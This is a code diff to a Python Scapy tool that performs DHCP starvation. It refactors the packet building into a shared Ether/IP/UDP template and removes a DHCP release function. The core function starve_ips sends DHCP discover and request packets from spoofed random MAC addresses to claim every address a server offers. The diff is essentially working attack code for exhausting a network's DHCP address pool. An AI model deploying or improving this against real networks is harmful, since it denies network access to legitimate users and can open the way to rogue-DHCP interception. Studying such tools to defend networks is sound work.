@@ -22,6 +22,7 @@ args.keep_alive_while_starving=False
 args.sniff_interface : str = None
 args.ttl = 5
 
+
 def get_dhcp_type_value(dhcp_type : str):
     return next((k for k, v in DHCPTypes.items() if v == dhcp_type), None)
     
@@ -69,27 +70,6 @@ def mac_to_binary(regular_mac : str):
 
     return result
 
-
-def dhcp_release(server_mac : str ,server_ip : str, ip : str , src_mac : str, transaction_id : hex):
-    """
-    returns a DHCP release with the source and dest being the args
-    """
-    function_name = inspect.currentframe().f_code.co_name
-
-
-    dhcp_options= [('message-type','release'), ('server_id', server_ip),('end')]
-
-
-    dhcp_release_packet = Ether(dst=server_mac, src=src_mac)\
-                    / IP(dst=server_ip,src=ip,ttl=args.ttl, type = 'IPv4')\
-                    / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
-                    / BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTPREQUEST', chaddr=mac_to_binary(src_mac), xid = transaction_id, ciaddr = ip)\
-                    / DHCP(options=dhcp_options)
-    
-    logger.debug(f"{function_name} : {dhcp_release_packet.summary()}")
-        
-    return dhcp_release_packet
-
 def dhcp_request( ip : str, device_mac : str, transaction_id, server_ip : str):
     """
     returns a DHCP request with the source being the args
@@ -98,10 +78,7 @@ def dhcp_request( ip : str, device_mac : str, transaction_id, server_ip : str):
     dhcp_options= [('message-type','request'), ('client_id', device_mac), ('requested_addr', ip),('server_id', server_ip),('end')]
     
 
-    request_packet = Ether(dst=ETHER_BROADCAST, src=device_mac, type='IPv4')\
-                    / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=args.ttl)\
-                    / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
-                    / BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTREQUEST', chaddr=mac_to_binary(device_mac), xid = transaction_id)\
+    request_packet = BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTREQUEST', chaddr=mac_to_binary(device_mac), xid = transaction_id)\
                     / DHCP(options=dhcp_options)
     logger.debug(f"{function_name} :  {request_packet.summary()}")
     return request_packet
@@ -112,10 +89,8 @@ def dhcp_discover(src_mac : str):
     """
     
     dhcp_options = [('message-type', 'discover'), ('client_id', src_mac), ('param_req_list', [1, 3, 6, 15, 31, 33, 43, 44, 46, 47, 119, 121, 249, 252]),('end')]
-    discover_packet = Ether(dst = ETHER_BROADCAST, src=src_mac, type='IPv4')\
-                        / IP(dst=IP_GLOBAL_BROADCAST, src='0.0.0.0')\
-                        / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
-                        / BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTREQUEST' ,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0', flags = 'B')\
+
+    discover_packet = BOOTP(htype = 'Ethernet (10Mb)', op = 'BOOTREQUEST' ,chaddr=mac_to_binary(src_mac), xid = random_transaction_id(), ciaddr = '0.0.0.0', flags = 'B')\
                         / DHCP(options=dhcp_options)
     return discover_packet
 
@@ -267,6 +242,9 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
     this starvation session
     """
 
+    template_udp_packet = Ether(dst=ETHER_BROADCAST)\
+                    / IP(dst=IP_GLOBAL_BROADCAST,src='0.0.0.0',ttl=args.ttl)\
+                    / UDP(dport=DHCP_ATTS.SERVER_PORT,sport=DHCP_ATTS.CLIENT_PORT)\
 
     function_name = inspect.currentframe().f_code.co_name
     
@@ -294,6 +272,7 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         mac_template = mac.macs[random.randint(0,len(mac.macs) - 1)][0]
 
         temp_mac = str(RandMAC(mac_template))
+        template_udp_packet[Ether].src = temp_mac
 
         offer = [None]
         
@@ -301,7 +280,9 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         sniff_thread.start()
         
         time.sleep(0.2)
-        sendp(dhcp_discover(temp_mac), interface)
+        sendp(
+                template_udp_packet / dhcp_discover(temp_mac), 
+                interface)
         
         sniff_thread.join()
         
@@ -319,7 +300,9 @@ def starve_ips( server_ip : str, server_mac : str , interface : str = conf.iface
         
         #TODO start a thread that sniffs for ACK or NAK
 
-        sendp(dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip), interface)
+        sendp(
+                template_udp_packet / dhcp_request(offered_ip, temp_mac, random_transaction_id(), server_ip), 
+                interface)
         
         #TODO stop the thread and check if we got ACKed
 
